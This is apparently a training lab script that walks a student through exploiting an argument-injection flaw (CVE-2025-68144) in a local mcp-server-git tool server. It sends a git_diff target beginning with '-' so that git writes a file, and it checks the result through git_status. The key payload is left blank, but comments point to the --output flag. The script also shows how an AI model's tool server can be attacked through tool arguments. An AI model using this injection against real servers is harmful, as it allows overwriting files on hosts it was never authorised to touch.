"""attack_anthropic_git.py — YOUR turn.  Anthropic mcp-server-git <= 2025.11.25 · CVE-2025-68144.

This is the subtle one: there is NO shell, so shell metacharacters do nothing.
git_diff hands your `target` straight to git as a command-line argument:

    def git_diff(repo, target, context_lines=3):
        return repo.git.diff(f"--unified={context_lines}", target)   # target unvalidated

Because `target` becomes its own argv element, a value that begins with `-` is
parsed by git as a FLAG, not a revision. Your job: pick a real `git diff` flag
that makes git write a file, and point it at a path inside the repo so
git_status will reveal it.

This script already (A) shows the repo status and (C) self-verifies. You fill
in the malicious `target` in build_target().

    python real-servers/attack_anthropic_git.py --url http://127.0.0.1:8091/sse \
        --repo /tmp/anthropic_lab_repo        # absolute path, NOT ~/... (it's read on the server)

Success = Stage C's git_status lists your marker file as untracked.
"""

import argparse
import sys

from _mcp_sse import banner, list_tool_names, mcp_session, run, text_of

DEFAULT_URL = "http://127.0.0.1:8091/sse"
MARKER = "INJECTED_BY_68144.txt"


def build_target() -> str:
    """Return the malicious `target` for git_diff.

    It must make `git diff` write its output to the relative path MARKER (so the
    file lands inside the repo and git_status can see it).
    """
    # ========================================================================
    # YOUR JOB starts here.
    # `git diff` accepts a flag of the form  --<name>=<file>  that redirects its
    # output to <file>. Find that flag (try `git diff --help`) and build the
    # target so the file written is exactly MARKER.
    return ""   # TODO: e.g. f"--????={MARKER}"
    # YOUR JOB ends here.
    # ========================================================================


async def attack(url: str, repo: str) -> int:
    async with mcp_session(url) as s:
        banner("Recon · confirm git_diff + git_status are exposed")
        names = await list_tool_names(s)
        print("tools:", ", ".join(names))
        if "git_diff" not in names or "git_status" not in names:
            print("✗ expected git_diff + git_status — is this Anthropic mcp-server-git?")
            return 1

        banner("Stage A · benign · status of the target repo")
        print(text_of(await s.call_tool("git_status", {"repo_path": repo})))

        target = build_target()
        if not target:
            print("\n(!) build_target returned '' — fill in 'YOUR JOB' and re-run.")
            return 1

        banner("Stage B · YOUR argument injection via the diff target")
        print("target:", target)
        b = text_of(await s.call_tool("git_diff", {"repo_path": repo, "target": target}))
        print(b if b else "(empty diff returned — the bytes went to your --output file)")

        banner("Stage C · self-verify via git_status")
        st = text_of(await s.call_tool("git_status", {"repo_path": repo}))
        print(st)

        print()
        if MARKER in st:
            print(f"✓ ATTACK SUCCEEDED — git wrote {MARKER} with no shell involved. "
                  "An absolute --output path would overwrite any file the server can write.")
            return 0
        print(f"✗ {MARKER} not present — your target wasn't treated as a flag, or you "
              "hit a patched (>= 2025.12.18) server that rejects targets starting with '-'.")
        return 1


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default=DEFAULT_URL)
    ap.add_argument("--repo", default="/tmp/anthropic_lab_repo",
                    help="path to a real git repo ON THE SERVER")
    args = ap.parse_args()
    return run(attack(args.url, args.repo))


if __name__ == "__main__":
    sys.exit(main())
